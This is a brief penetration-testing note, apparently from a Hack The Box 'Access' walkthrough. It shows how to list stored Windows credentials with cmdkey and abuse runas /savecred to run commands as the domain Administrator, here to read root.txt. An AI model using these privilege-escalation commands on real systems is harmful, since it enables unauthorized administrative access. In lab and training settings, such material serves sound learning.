## Runas

in simple terms - RUN a command AS someone else

Once on a shell

begin enumeration

`cmdkey /list

read stored credentials

```
C:\Users\security\Desktop>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator
```

Take note we have access administrator and the domain password stored

with runas we can chain commands.

```
\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c <Enter commands>"
```

Example for HTB machine 'Access'
```
\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\security\root.txt"
```

This works as the root creds are already stored in the system for us and we have permission to run as.
